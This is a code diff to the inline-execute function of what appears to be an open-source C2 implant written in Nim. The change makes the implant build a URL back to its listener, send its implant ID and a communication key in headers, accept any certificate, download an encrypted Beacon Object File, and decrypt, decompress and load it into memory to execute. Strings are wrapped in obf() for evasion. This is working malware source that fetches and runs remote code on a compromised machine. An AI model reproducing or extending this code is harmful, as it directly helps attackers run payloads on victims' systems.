@@ -243,21 +243,69 @@ proc RunCOFF(functionName:string,fileBuffer:seq[byte],argumentBuffer:seq[byte],m
         entryPtr(unsafeaddr(argumentBuffer[0]),cast[uint32](argumentBuffer.len))
     return true
 
-# Execute a BOF from an encrypted and compressed stream
+# Execute a BOF from an encrypted and compressed stream or from a server file
 proc inlineExecute*(li : Listener, args : varargs[string]) : string =
-    # This shouldn't happen since parameters are managed on the Python-side, but you never know
+    # Validate arguments
     if (not args.len >= 2):
-        result = obf("Invalid number of arguments received. Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.")
+        result = obf("Invalid number of arguments received. Usage: 'inline-execute [file_id] [entrypoint] <arg1 type1 arg2 type2..>'.")
         return
     
-    let
-        bofB64: string = args[0]
+    var 
+        fileBuffer: seq[byte]
+        nimEntry: string = args[1]
 
-    var dec = decryptData(bofB64, li.UNIQUE_XOR_KEY)
-    var decStr: string = cast[string](dec)
-    var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))
+    # Get the file ID/path
+    let fileId: string = args[0]
+    echo obf("DEBUG InlineExecute: fileId: ") & fileId
+    
+    # Build URL with fileId
+    var url = toLowerAscii(li.listenerType) & obf("://")
+    if li.listenerHost != "":
+        url = url & li.listenerHost
+    else:
+        url = url & li.implantCallbackIp & obf(":") & li.listenerPort
+    url = url & li.taskpath & obf("/") & fileId
+    
+    echo obf("DEBUG InlineExecute: Requesting file from URL: ") & url
 
-    var nimEntry = args[1]
+    # Get the file using the same approach as upload.nim
+    let req = Request(
+        url: parseUrl(url),
+        headers: @[
+                Header(key: obf("User-Agent"), value: li.userAgent),
+                Header(key: obf("X-Request-ID"), value: li.id),
+                Header(key: obf("Content-MD5"), value: "inline-execute"), # Identifier for server
+                Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
+            ],
+        allowAnyHttpsCertificate: true,
+    )
+    let res: Response = fetch(req)
+
+    # Check the result
+    if res.code != 200:
+        return obf("Error fetching BOF file: Server returned code ") & $res.code
+    
+    # Log status code for debugging
+    echo obf("DEBUG InlineExecute: Response status: ") & $res.code
+    
+    # Process file content
+    try:
+        var dec = decryptData(res.body, li.UNIQUE_XOR_KEY)
+        var decStr: string = cast[string](dec)
+        fileBuffer = convertToByteSeq(uncompress(decStr))
+        
+        # Extract and log the original filename from header (if available)
+        try:
+            if "X-Original-Filename" in res.headers:
+                let encryptedFilename = base64.decode(res.headers["X-Original-Filename"])
+                let serverFilename = decryptData(encryptedFilename, li.UNIQUE_XOR_KEY)
+                echo obf("DEBUG InlineExecute: Original filename from server: ") & serverFilename
+            else:
+                echo obf("DEBUG InlineExecute: No filename provided in headers")
+        except:
+            echo obf("DEBUG InlineExecute: Error processing X-Original-Filename header")
+    except:
+        return obf("Error: Unable to decrypt and uncompress the file data from server")
 
     # Unhexlify the arguments
     var argumentBuffer: seq[byte] = @[]
